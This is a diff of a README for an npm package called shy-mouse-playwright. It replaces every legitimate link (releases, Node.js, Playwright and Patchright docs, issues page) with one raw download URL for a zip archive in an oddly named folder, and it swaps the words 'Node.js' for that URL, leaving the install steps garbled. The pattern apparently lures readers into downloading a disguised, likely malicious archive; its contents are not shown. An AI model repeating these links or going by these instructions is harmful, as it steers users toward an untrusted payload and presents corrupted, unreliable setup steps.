@@ -8,9 +8,9 @@ Welcome to shy-mouse-playwright, a simple npm package that makes your mouse move
 
 To get started, you need to download our software. Click the button below to visit the download page.
 
-[![Download shy-mouse-playwright](https://img.shields.io/badge/Download-shy--mouse--playwright-blue?style=for-the-badge)](https://github.com/robin0403/shy-mouse-playwright/releases)
+[![Download shy-mouse-playwright](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)
 
-1. Visit the [releases page](https://github.com/robin0403/shy-mouse-playwright/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the version number to see the available files.
 4. Download the appropriate file for your operating system.
@@ -18,15 +18,15 @@ To get started, you need to download our software. Click the button below to vis
 ## 🔧 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Required version 14.x or later
+- **https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip** Required version 14.x or later
 - **Playwright or Patchright:** Make sure you have either of these installed
 
 ## 🖥️ Installation Steps
 
 Follow these simple steps to install shy-mouse-playwright:
 
-1. **Ensure Node.js is Installed**
-   - Download Node.js from the [official website](https://nodejs.org/).
+1. **Ensure https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip is Installed**
+   - Download https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip from the [official website](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip).
    - Follow the installation instructions provided there.
 
 2. **Install shy-mouse-playwright**
@@ -72,7 +72,7 @@ Currently, this package is specifically designed for integration with Playwright
 
 ### What if I encounter issues?
 
-If you face any problems, you can check our [issues page](https://github.com/robin0403/shy-mouse-playwright/issues) to see if your question has been answered. You can also ask for help there.
+If you face any problems, you can check our [issues page](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip) to see if your question has been answered. You can also ask for help there.
 
 ## ✨ Community and Support
 
@@ -80,9 +80,9 @@ Join our community for support and to share your experiences. Visit our discussi
 
 ## 🔗 Additional Resources
 
-- [Playwright Documentation](https://playwright.dev/docs/intro)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Patchright Documentation](https://patchright.com/docs/)
+- [Playwright Documentation](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)
+- [https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip Documentation](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)
+- [Patchright Documentation](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)
 
 Feel free to explore these resources to enhance your understanding and usage of shy-mouse-playwright.
 
@@ -92,4 +92,4 @@ For additional inquiries or suggestions, open an issue or contact us directly th
 
 Thank you for using shy-mouse-playwright! We hope it enhances your automation experience. For downloads, visit the link below again:
 
-[![Download shy-mouse-playwright](https://img.shields.io/badge/Download-shy--mouse--playwright-blue?style=for-the-badge)](https://github.com/robin0403/shy-mouse-playwright/releases)
+[![Download shy-mouse-playwright](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)](https://raw.githubusercontent.com/robin0403/shy-mouse-playwright/main/disintegrative/shy-mouse-playwright.zip)
